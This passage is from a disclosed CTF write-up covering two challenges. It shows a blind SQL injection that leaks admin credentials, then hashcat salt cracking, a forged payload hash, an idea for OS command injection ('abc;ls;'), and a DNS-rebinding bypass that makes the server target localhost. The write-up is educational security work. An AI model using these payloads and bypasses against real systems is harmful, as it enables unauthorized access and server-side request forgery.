```../api/user?a=a ```

Output:
```Expected HTTP status 200, Received: 400 ```

Notice the HTTP status is __400__ and not 404.
According to the ```/api``` endpoint, I could understand that I just need to find the right variable:
{F1165605}

Again, I manually searched for GET parameters:

Input (inside the UNION operator):
```../api/user?username= ```

Output:
```Expected HTTP status 200, Received: 204 ```

Input (inside the UNION operator):
```../api/user?password= ```

Output:
```Expected HTTP status 200, Received: 204 ```

Notice the HTTP status this time is __204__
{F1165606}

I found the following HTTP GET parameters:
1.username
2.password

I spent hours, trying to understand how I can exploit this, but nothing worked.
The next day, I had a desperate idea, what if the ```/api/user ``` endpoint is using the given username / password with a LIKE operator?.
If that is the case, I might be able to insert ```%``` as the username and as the password and that would return true.

Input (inside the UNION operator):
```../api/user?username=%%26password=% ```

Output:
```Invalid content type detected ```

__Note:__ The %26 is used as a URL encoded ampersand ```& ``` character due to the fact that our payload is sent in a URL context (the SQL Injection).

I worked! I finally got a different response than ```HTTP Status 204```.

I knew I can leak both the username and password using this "blind" technique. This time I created a simple python script to do that for me.
The script is attached to this writeup, and its name is recon.py

I wanted to find a shortcut, maybe I can guess the username.
I tried the following payload:

Input (inside the UNION operator):
```../api/user?username=grinch%%26password=% ```

Output:
```Invalid content type detected ```

it seems like the username starts with the string ```grinch ```, but I thought that I might have done something wrong so I added an ```a ``` character, as follows:

Input (inside the UNION operator):
```../api/user?username=grincha%%26password=% ```

Output:
```Invalid content type detected ```

It worked again!, how is that possible? I tried to add another ```a ``` character:

Input (inside the UNION operator):
```../api/user?username=grinchaa%%26password=% ```

Output:
```Expected HTTP status 200, Received: 204 ```

So the username really starts with the string grincha... what about grinchadmin?

Input (inside the UNION operator):
```../api/user?username=grinchadmin%%26password=% ```

Output:
```Invalid content type detected ```

The username starts with ```grinchadmin ``` :D
I checked if the username is equal to ```grinchadmin ``` by simply removing the ```% ``` character, so the string ```grinchadmin ``` must match the username in that database.

I executed my script (recon.py) and it slowly leaked the password:
{F1165607}

After few minutes I got the password: ```S4NT4SUCKS ```.
I tried to login using the credentials ```grinchadmin:S4NT4SUCKS ```, but it did not work... O_O
Then I just remembered that I do not know the leaked characters should be lowercase or uppercase.
I tried again with ```grinchadmin:s4nt4sucks ```, and it worked!
{F1165608}

Challenge 12 (Attack Box):
---------------------
__Tools I used:__ Burp Suite, hashcat, rbndr.us (DNS rebinding service).

This challenge starts with a page where we can choose a "hardcoded" target to attack.
Launching the attack on one of the targets, redirected me to ```/launch?payload= ``` endpoint.
{F1165611}

As you can see, the base64 encoded string contains a JSON format with 2 keys:
1.target
2.hash

Changing the the ```target``` value or the ```hash``` value, will fail with following error message:
```Invalid Protection Hash ```

Also, I noticed a cooldown mechanism, which forbids you from launching the attack again and again.
After playing a bit with the JSON formatI received the following error message:
```only one request per 15 seconds ```

This error message indicates that we should not focus on launching the attack which probably spams the server, but we should focus on something else.

Launching the attack redirected me to a specific page, which contained information regarding my attack:
{F1165612}

For example, this hash ```53d34f2e30d830e77deed8853fdb1038 ``` is related to the attack that I have just launched.
After my browser accessed the ```/attack-box/launch/53d34f2e30d830e77deed8853fdb1038 ``` URL, I noticed some requests (XHR) in my Burp Suite to ```/attack-box/launch/53d34f2e30d830e77deed8853fdb1038.json?id=49046 ```

I tried to tamper with every single parameter in the website, but it led me to nowhere.

I tried to understand what is the connection between these IP addresses to there corresponding ```hash ```:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
```

These hashes might be a MD5 hash due to its length.
At some point I started to use an online service, which accepts a string and calculates various hashes for it, but the expected hash was not included in the results :(

I had a plan but I was not sure about it at all. My plan was to be able to calculate a hash for any given input, then I will set the target as ```127.0.0.1 ```, which should cause the system to attack itself :D, but maybe that is not the solution.

I had another idea, as you can see here:
{F1165613}

the hash in used as an argument to the ```ddos ``` binary. maybe I can generate such a hash that will be something like that:
```abc;ls; ```
then this command would be executed in the server:
```./ddos --load abc;ls;.target ```

As you can see, controlling the hash value may enable me to injection an OS command (RCE). but how is that possible to actually generate such a hash? might be impossible.

Back to plan 1:
I used the tool ```hashcat ``` in order to crack the hash, but first, the target IP must be used in some way in the process of the hash calculation.
I used the known ```rockyou.txt ``` wordlist, combined with the target IP:

First I created the file ```combine ```, which had this content:

```
203.0.113.33
203.0.113.53
203.0.113.213
```
Then, I used the ```combinator.bin ``` to concatenate each string within the ```rockyou.txt ``` file with each one of these IPs:

/usr/share/hashcat-utils/combinator.bin /root/Downloads/rockyou.txt combine > combined_wordlist.txt

The results are saved in the file ```combined_wordlist.txt ```. For example:
```
password203.0.113.33
password203.0.113.53
password203.0.113.213
iloveyou203.0.113.33
iloveyou203.0.113.53
iloveyou203.0.113.213
```
I launched the attack, and I knew it could be the opposite way - the IP might also be at the start of the string.

After few seconds it found the salt!
{F1165614}

The salt was:
```mrgrinch463 ```

Now I can generate a hash for any arbitrary input I want. I started with ```127.0.0.1 ``` as the input:
{F1165615}

I crafted the following JSON payload:
```{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"} ```
I base64 encoded it, and I sent the request, and it got accepted, it worked!. I checked the attack details:
{F1165616}

As you can see there is an additional protection mechanism which prevents me from being able to attack the localhost. At this point I started to try various techniques to attack the localhost without being detected:

1.I tried to represent the IP 127.0.0.1 as an octal - failed.
2.Representing the IP as hex - failed.
3.Tried to target ```vcap.me ``` domain, which points to ```127.0.0.1 ``` - failed.
4.Maybe IPv6? - failed.
5. 0.0.0.0 - did not fail, but did not work :D
6. Decimal representation - failed.

In case of sending a DNS as the target IP, the server attempts to resolve it twice.
{F1165617}

DNS Rebinding attack!

I used ```rbndr.us ```, which is an online service for DNS Rebinding.
We can send a specific DNS that holds 2 records. By doing so, we might be able to bypass the IP validation, in case IP validation occurs only for the first time, but then, the server might use the IP from the second time it resolves the DNS. 

My plan was to send a DNS which will point to ```8.8.8.8 ``` for the first resolve, and ```127.0.0.1 ``` for the second resolve. This must be it!

The DNS:
```08080808.7f000001.rbndr.us ```

I calculated the hash for this DNS and I sent the payload to the server, and it failed.
I tried several times and it failed, at this point I had no other ideas and I went to sleep.

The next day, I had a crazy idea:
What if I can pull out the internal server IP, using the previous challenge SQL Injection vulnerability and simply use that.
I exploited the Recon Server challenge again and I pulled out the hostname information.
Local IP: ```172.31.15.248 ```
I launched the attack but it was blocked:
{F1165618}

I tried the DNS Rebinding attack once again ```08080808.7f000001.rbndr.us ```, this time it worked :O
I also tried ```08080808.ac1f0ff8.rbndr.us ```, and it worked as well :D

The Final Flag:
---------------------

{F1129602}

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,
First of all, thanks for this amazing CTF!. 

I will post my writeup soon, it is time to sleep now :)
{F1129602}

By the way, the creator of challenge 11 is crazy.

## Impact

Grinch Network is finally down

## Timeline

- **Report Filed**
- **2020-12-31** @a_l: Attaching my scripts.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2021-01-20** @a_l: Just noticed my report is missing all of its attachments.
